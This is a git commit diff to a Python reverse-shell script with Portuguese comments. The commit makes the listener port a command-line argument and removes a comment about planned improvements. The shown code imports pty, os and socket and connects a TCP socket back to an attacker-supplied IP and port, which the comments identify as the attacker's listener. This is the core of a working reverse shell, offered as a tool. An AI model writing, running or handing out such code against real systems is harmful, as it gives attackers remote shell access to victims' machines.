e12c2220702ad1b2e08389e1dae72ac21be28afd
White Rose <85945510+paixaoalmeida@users.noreply.github.com>
2022-06-10 16:03:27 -0300

    Update ReverseShell.py

--- ReverseShell.py
+++ ReverseShell.py
@@ -1,11 +1,10 @@
 #reverse_shell usando python
 #Uma boa parte dos novos distros linux não tem a opção -e do netcat, então usaremos o Python para fazer uma conexão reversa
-#Vou fazer muitas mekhorias ainda, nesse momento atende só a distribuições linux, quero melhorar ele bastante
 
 import pty, os, socket, sys
 
 ip = sys.argv[1]
-porta = 777
+porta = int(sys.argv[2]) #Tem que ser inteiro para o argumento no script
 
 s = socket.socket()   #socket
 s.connect((ip, porta)) #conectando o socket TCP/IP no IP e porta alvo que estarão escutando (atacante)
